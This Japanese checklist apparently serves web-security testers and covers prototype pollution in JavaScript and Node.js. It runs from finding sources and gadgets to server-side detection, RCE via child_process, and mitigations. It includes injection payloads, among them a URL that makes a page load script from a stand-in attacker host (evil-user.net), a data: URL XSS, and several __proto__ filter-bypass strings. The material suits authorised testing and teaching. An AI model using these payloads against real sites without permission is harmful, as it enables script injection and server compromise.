# プロトタイプポリューション 診断チェックリスト

PortSwigger Web Security Academy の解説を読み、診断の手順として組み直したノートです。原文は転載していません。詳しい説明や演習は出典を見てください。JavaScript/Node.jsに特有の脆弱性。

診断は、自分の管理下の環境か、書面で許可を得た対象にだけ行います。サーバー側のプロトタイプ汚染は、Nodeプロセスの寿命いっぱい影響が残り、リセットする手段がないため、本番環境での試行は特に慎重に。

## 1. 前提知識

JavaScriptのオブジェクトは、キーが指定されていないプロパティを、**プロトタイプチェーン**を通じて継承する。`Object.prototype`はすべてのオブジェクトの祖先にあたる。

**プロトタイプポリューション**は、ユーザー制御のプロパティを含むオブジェクトを、既存オブジェクトに再帰的にマージする処理で、キーのサニタイズが漏れている場合に起きる。`__proto__`のようなキーを注入すると、そのネストされたプロパティが、対象オブジェクト自身ではなく**プロトタイプ自体**に代入されてしまう。結果、その実行環境の全オブジェクトが、攻撃者の注入した値を継承してしまう。

成立には3要素が必要。

- **ソース**: 任意のプロパティをプロトタイプに注入できる入力経路。
- **シンク**: 任意のコード実行につながるJavaScript関数・DOM要素。
- **ガジェット**: 適切な検証なしにシンクへ渡されてしまう、攻撃者が制御可能なプロパティ。

ソースだけではほとんど無害。ソースとシンクをつなぐガジェットがあって初めて、実際の攻撃に発展する。

## 2. ソースを探す(クライアント側)

### 2-1. 手作業での確認

1. クエリ文字列、URLフラグメント、JSON形式の入力に、`__proto__[プロパティ名]=値`の形で注入する。例: `?__proto__[foo]=bar`
2. ブラウザのコンソールで`Object.prototype.foo`を確認する。値が返れば汚染に成功している。`undefined`なら失敗。
3. 角括弧記法で通らなければ、ドット記法(`__proto__.foo=bar`)も試す。逆も同様。
4. 両方とも通らなければ、`constructor`経由(3章)を試す。

### 2-2. DOM Invaderでの確認

Burpの組み込みブラウザに搭載されたDOM Invaderは、閲覧中に自動でソースを検出できる。手作業よりはるかに速い。

## 3. `constructor`経由でのアクセス(`__proto__`フィルタの回避)

`__proto__`という文字列だけをフィルタしている対策は、別の経路で回避できる。

- プロトタイプを`null`に設定していない限り、すべてのオブジェクトは`constructor`プロパティ(そのオブジェクトを作ったコンストラクタ関数への参照)を持つ。
- コンストラクタ関数自体も`prototype`プロパティを持つため、`myObject.constructor.prototype`は`myObject.__proto__`と等価。
- 例: `?constructor.prototype.foo=bar`のような形で、`__proto__`の文字列を一切使わずにプロトタイプへアクセスできる。

Node.jsの`--disable-proto=delete`や`--disable-proto=throw`フラグで`__proto__`自体を無効化していても、この`constructor`経由の手口は依然として通る。

## 4. サニタイズの不備(再帰的でない除去)

文字列`__proto__`を除去するだけの対策で、1回しか処理していない場合、入れ子にした文字列で回避できる。

- 例: `__pro__proto__to__.gadget=payload` から `__proto__`という文字列を1回だけ除去すると、残った`__proto__.gadget=payload`が有効なペイロードとして組み立て直されてしまう。

## 5. ガジェットを探す(クライアント側)

ソースが見つかったら、プロトタイプに注入した値が、実際にどこかで危険な処理(シンク)に渡されているかを探す。

1. ソースコードを読み、アプリやライブラリが使っているプロパティを把握する。
2. Burpでレスポンスのインターセプトを有効にし、対象のJavaScriptに`debugger`文を仕込む。
3. ブラウザでそのスクリプトが読まれるページを開き、一時停止させる。
4. コンソールで、疑わしいプロパティに`getter`を仕込む: `Object.defineProperty(Object.prototype, 'プロパティ名', { get() { console.trace(); return 'polluted'; } })`
5. 実行を継続し、スタックトレースが出れば、そのプロパティがどこかで読み取られている。該当の行にジャンプし、`innerHTML`や`eval()`のようなシンクに渡っているかを、デバッガでステップ実行して確認する。

この作業は手間がかかるため、DOM Invaderの自動スキャン機能(ガジェット探索・PoC生成まで対応)を使う方が実用的。

### ガジェットの例

ライブラリが設定オブジェクトの値を、デフォルト値へのフォールバックとして使っている場合(`let transport_url = config.transport_url || defaults.transport_url;`)、`config.transport_url`が明示的に設定されていなければガジェットになりうる。この値をもとに`<script>`タグの`src`を組み立てている(`script.src = \`${transport_url}/example.js\`;`)なら、プロトタイプに`transport_url`を注入して、任意の外部ドメインからスクリプトを読み込ませる、または`data:`URLで直接XSSペイロードを埋め込むことができる。

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

## 6. サーバー側プロトタイプポリューション(Node.js)

クライアント側に比べて検出が難しい。ソースコードが見られない、開発者ツールで実行時の状態を見られない、汚染の影響が実行環境全体に永続して戻せない、実際のプロパティ名で汚染すると機能が壊れたりサーバーが落ちたりする(DoSのリスク)、といった制約がある。以下は非破壊的に確認できる手法。

### 6-1. 汚染したプロパティが応答に反映されるケース

`for...in`ループは、継承したプロパティも含めて列挙する。POST/PUTでJSONを送り、応答にオブジェクトがそのまま返るAPIで、`__proto__`に適当なプロパティを注入し、応答にそのプロパティが現れるか確認する。

```json
{"user":"wiener", "firstName":"Peter", "__proto__":{"foo":"bar"}}
```

応答に`"foo":"bar"`が含まれれば汚染が成立している。ユーザー情報の更新系機能は、自分のユーザーオブジェクトに任意のプロパティを追加できる=権限昇格に繋がりうるガジェットの候補として調べる価値がある。

### 6-2. 応答に反映されないケース(サーバーの挙動の変化で判定)

既知のフレームワーク設定オプションに該当するプロパティ名を注入し、注入前後でサーバーの挙動が変わるかを確認する。**以下はNode.js/Expressおよび関連ミドルウェアの、特定バージョンでの既知ガジェット例**であり、対象のフレームワーク・バージョンが異なれば同じ名前のプロパティが同じ効果を持つとは限らない。ステータスコードの上書きは、監視やログ処理に影響する可能性もあるため、完全に無害とは言い切れない。

- **ステータスコード上書き**: Node (`http-errors`モジュールなど)でエラーの`status`プロパティが未設定の場合、プロトタイプに珍しい値の`status`(400〜599の範囲)を注入し、以降のエラー応答のステータスコードがその値になるか確認する。
- **JSONインデント(`json spaces`)上書き**: Expressの`json spaces`設定が未指定の場合、プロトタイプに`json spaces`を注入し、以降のJSON応答のインデント幅が変わるか確認する(Express 4.17.4で修正済みだが、未更新のサイトでは有効)。
- **文字セット(charset)上書き**: `body-parser`等のミドルウェアが、リクエストのcharset指定が無い場合に空文字列へフォールバックする実装だと、プロトタイプに`content-type`プロパティ(charsetを含む値)を注入することで、以降のリクエストボディの解釈に使われる文字セットを変えられる。UTF-7でエンコードした値をJSONに含め、汚染前後でデコードされ方が変わるかを見る。

### 6-3. 自動スキャン

Burp SuiteのServer-Side Prototype Pollution Scanner拡張を使うと、トラフィックを選んで上記の非破壊的な手法を自動で試せる。

## 7. 入力フィルタの回避(サーバー側共通)

`__proto__`のような疑わしいキーをブロックする対策は、長期的な解決にならない。

- 4章の再帰処理の漏れを突く難読化
- 3章の`constructor`経由でのアクセス
- `--disable-proto`フラグが設定されていても、`constructor`経由は依然有効

## 8. サーバー側プロトタイプポリューションからRCEへ(Node.js)

### 8-1. 脆弱なリクエストの特定

コマンド実行につながるシンクの多くは`child_process`モジュールにあり、汚染を起こしたリクエストとは非同期に(別のリクエストで)起動されることが多い。OASTで検出する。**8-1〜8-3はいずれも、攻撃者が制御できる値を未定義のオプションとして実際に読み取る処理が、対象のコード・バージョンに存在することが前提**。プロトタイプを汚染できることと、それが子プロセス生成の挙動に反映されることは別の確認が必要。

- `NODE_OPTIONS`環境変数は、新しいNodeプロセス起動時のデフォルト引数を指定する。`env`オブジェクトのプロパティとしてアクセスされるため、未定義ならプロトタイプポリューションで制御できる可能性がある。
- 子プロセス生成関数の`shell`オプションと組み合わせ、新しいNodeプロセスが作られるたびにOAST通信を発生させるペイロードを仕込める。

### 8-2. `child_process.fork()`経由

`fork()`の`execArgv`オプション(未定義であれば汚染可能)に、`--eval=require('<モジュール>')`のような任意のJavaScriptを渡せると、強力な実行経路になる。

### 8-3. `child_process.execSync()`経由

アプリが自前で`execSync()`を呼んでいる場合、未定義になりがちな`shell`と`input`オプションを同時に汚染することで、意図したコマンドを上書きして任意コマンドを実行できることがある。`shell`はシェルの実行ファイル名のみ指定可能(追加の引数は不可)で、標準入力からコマンドを受け取れるものに限る。VimやExのようなテキストエディタが対象サーバーに入っていれば、対話的にコマンドを実行する入力形式(`:! コマンド\n`)で悪用できることがある。

## 9. 誤検知・見落としやすい点

- クライアント側では、`Object.prototype.foo`がコンソールで値を返すかどうかで、確実に汚染の成否を判定できる。応答や見た目の変化だけで判断しない。
- サーバー側では、応答に反映されないことがほとんど。6-2のような非破壊的な挙動変化の確認方法を優先する。実プロパティでの汚染は、DoSリスクを伴うため最後の手段にする。
- `__proto__`の文字列フィルタだけの対策は、`constructor`経由やネストした文字列での回避が効くことが多い。フィルタがあることと、安全であることは別。
- サーバー側の汚染はプロセスの寿命いっぱい残る。本番環境でのテストは、リセット手段がないことを前提に、影響範囲を極力絞る。

## 10. 対策(開発側への指摘事項)

- プロパティキーのサニタイズ(`__proto__`などの拒否)は、応急処置にすぎない。`constructor`経由や難読化で回避されうるため、長期的な解決策にしない。
- より確実な対策は、プロトタイプオブジェクト自体の変更を禁止すること。`Object.freeze(Object.prototype)`で、プロパティの追加・変更を一切できなくする。`Object.seal()`は既存プロパティの値の変更だけ許す、より緩い代替。
- オブジェクトが`Object.prototype`を継承しないようにする。`Object.create(null)`で作成したオブジェクトは、何も継承しない。
- 設定値などの保持に、素のオブジェクトではなく`Map`や`Set`を使う。これらは`get()`/`has()`のような組み込みメソッドが、オブジェクト自身が持つプロパティだけを返し、継承したプロパティを無視する。
- ガジェットが見つからなくても、プロトタイプポリューションのソース自体は修正する。将来のコード変更やライブラリの更新で、新たなガジェットが生まれる可能性があるため。
